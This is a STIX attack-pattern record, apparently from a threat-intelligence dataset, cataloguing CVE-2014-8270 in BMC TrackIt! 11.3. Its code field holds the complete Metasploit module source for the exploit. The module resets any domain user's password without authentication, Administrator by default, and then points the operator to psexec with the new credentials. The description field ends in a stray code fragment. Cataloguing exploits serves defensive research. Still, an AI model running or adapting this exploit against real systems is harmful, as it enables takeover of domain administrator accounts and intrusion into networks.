{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--704213f2-1692-4ccb-84cb-c80ef52a7a50",
    "created": "2024-08-14T16:29:29.78132Z",
    "modified": "2024-08-14T16:29:29.781324Z",
    "name": "BMC TrackIt! Unauthenticated Arbitrary User Password Change",
    "description": "( This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3 and possibly prior versions. If the password reset service is configured to use a domain administrator (which is the recommended configuration), then domain credentials can be reset (such as domain Administrator). ) 'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/bmc_trackit_passwd_reset.rb",
            "external_id": "bmc_trackit_passwd_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8270"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary User Password Change',\n      'Description'    => %q(\n      This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3\n      and possibly prior versions. If the password reset service is configured to use\n      a domain administrator (which is the recommended configuration), then domain\n      credentials can be reset (such as domain Administrator).\n      ),\n      'References'     =>\n        [\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-14-419/'],\n          ['CVE', '2014-8270']\n        ],\n      'Author'         =>\n        [\n          'bperry', # discovery/metasploit module,\n          'jhart'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-12-09'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),\n        OptString.new('LOCALUSER', [true, 'The user to change password for', 'Administrator']),\n        OptString.new('LOCALPASS', [false, 'The password to set for the local user (blank for random)', '']),\n        OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\\'s computer name will be autodetected', ''])\n      ])\n  end\n\n  def localuser\n    datastore['LOCALUSER']\n  end\n\n  def password_reset\n    begin\n      uri = normalize_uri(target_uri.path, 'PasswordReset')\n      send_request_cgi('uri' => uri)\n    rescue => e\n      vprint_error(\"#{peer}: unable to request #{uri}: #{e}\")\n      nil\n    end\n  end\n\n  def check_host(ip)\n    vprint_status(\"#{peer}: retrieving PasswordReset page to extract Track-It! version\")\n\n    unless (res = password_reset)\n      return\n    end\n\n    if res.body =~ /<title>Track-It! Password Reset/i\n      version = res.body.scan(/\\bBuild=([\\d\\.]+)/).flatten.first\n      if version\n        fix_version = '11.4'\n        if Rex::Version.new(version) < Rex::Version.new(fix_version)\n          report_vuln(\n            host: ip,\n            port: rport,\n            name: name,\n            info: \"Module #{fullname} detected Track-It! version #{version}\",\n            refs: references\n          )\n          vprint_status(\"#{peer}: Track-It! version #{version} is less than #{fix_version}\")\n          return Exploit::CheckCode::Vulnerable\n        else\n          vprint_status(\"#{peer}: Track-It! version #{version} is not less than #{fix_version}\")\n          return Exploit::CheckCode::Safe\n        end\n      else\n        vprint_error(\"#{peer}: unable to get Track-It! version\")\n        return Exploit::CheckCode::Unknown\n      end\n    else\n      vprint_status(\"#{peer}: does not appear to be running Track-It!\")\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def run_host(ip)\n    return unless check_host(ip) == Exploit::CheckCode::Vulnerable\n\n    if datastore['DOMAIN'].blank?\n      vprint_status(\"#{peer}: retrieving session cookie and domain name\")\n    else\n      vprint_status(\"#{peer}: retrieving domain name\")\n    end\n\n    unless (res = password_reset)\n      return\n    end\n\n    cookies = res.get_cookies\n    if datastore['DOMAIN'].blank?\n      if res.body =~ /\"domainName\":\"([^\"]*)\"/\n        domain = Regexp.last_match(1)\n        vprint_status(\"#{peer}: found domain name: #{domain}\")\n      else\n        print_error(\"#{peer}: unable to obtain domain name.  Try specifying DOMAIN\")\n        return\n      end\n    else\n      domain = datastore['DOMAIN']\n    end\n\n    full_user = \"#{domain}\\\\#{localuser}\"\n    vprint_status(\"#{peer}: registering #{full_user}\")\n    answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'vars_post' => {\n        'domainname' => domain,\n        'userName' => localuser,\n        'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',\n        'userQuestions' => %Q([{\"Id\":1,\"Answer\":\"#{answers.first}\"},{\"Id\":2,\"Answer\":\"#{answers.last}\"}]),\n        'updatequesChk' => 'false',\n        'SelectedQuestion' => 2,\n        'answer' => answers.last,\n        'confirmanswer' => answers.last\n      }\n    )\n\n    if !res || res.body != \"{\\\"success\\\":true,\\\"data\\\":{\\\"userUpdated\\\":true}}\"\n      print_error(\"#{peer}: Could not register #{full_user}\")\n      return\n    end\n\n    vprint_status(\"#{peer}: changing password for #{full_user}\")\n\n    if datastore['LOCALPASS'].blank?\n      password = Rex::Text.rand_text_alpha(10) + \"!1\"\n    else\n      password = datastore['LOCALPASS']\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'vars_post' => {\n        'newPassword' => password,\n        'domain' => domain,\n        'UserName' => localuser,\n        'CkbResetpassword' => 'true'\n      }\n    )\n\n    if !res || res.body != '{\"success\":true,\"data\":{\"PasswordResetStatus\":0}}'\n      print_error(\"#{peer}: Could not change #{full_user}'s password -- is it a domain or local user?\")\n      return\n    end\n\n    report_vuln(\n      host: ip,\n      port: rport,\n      name: name,\n      info: \"Module #{fullname} changed #{full_user}'s password to #{password}\",\n      refs: references\n    )\n    print_good(\"#{peer}: Please run the psexec module using #{full_user}:#{password}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-12-09"
}